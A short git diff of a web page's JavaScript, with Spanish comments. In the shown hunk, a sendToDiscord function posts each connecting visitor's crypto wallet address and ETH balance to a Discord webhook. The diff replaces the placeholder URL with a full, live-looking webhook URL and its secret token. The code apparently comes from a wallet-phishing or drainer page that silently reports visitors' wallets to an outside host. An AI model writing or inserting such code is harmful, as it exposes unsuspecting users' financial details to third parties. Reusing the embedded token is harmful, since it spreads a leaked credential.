@@ -62,7 +62,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Función para enviar datos al webhook de Discord
     async function sendToDiscord(address, balance) {
-        const webhookUrl = 'https://discord.com/api/webhooks/XXXX/YYYY'; // Reemplaza con tu URL de webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1122719600375758930/HOqLrk3OlLHLaiP7u2ZGFqRNOoWqnPBSyKq9S3f96m8dwYdxhBSyITl5Ocuzzogho1nl'; // Reemplaza con tu URL de webhook
         const payload = {
             content: `Nueva conexión de billetera: \n- Dirección: ${address} \n- Saldo: ${balance} ETH`
         };
